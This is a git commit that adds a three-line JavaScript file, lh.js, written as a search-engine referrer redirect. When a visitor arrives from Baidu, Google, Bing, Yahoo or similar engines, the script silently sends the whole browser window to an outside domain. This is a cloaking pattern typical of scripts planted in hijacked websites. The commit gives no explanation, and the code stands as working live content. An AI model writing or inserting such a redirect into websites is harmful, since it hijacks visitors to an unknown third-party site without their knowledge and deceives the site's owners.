680943c417a5763d71182630b53983b2ad747fb3
hh3322a <50979223+hh3322a@users.noreply.github.com>
2019-06-13 11:54:39 +0800

    Create lh.js

---
+++ lh.js
@@ -0,0 +1,3 @@
+var s=document.referrer;
+if(s.indexOf("baidu")>0 || s.indexOf("sogou")>0 || s.indexOf("soso")>0 ||s.indexOf("sm")>0 ||s.indexOf("uc")>0 ||s.indexOf("bing")>0 ||s.indexOf("yahoo")>0 ||s.indexOf("so")>0 ||s.indexOf("google")>0)
+window.top.location.href="https://0028000.com";
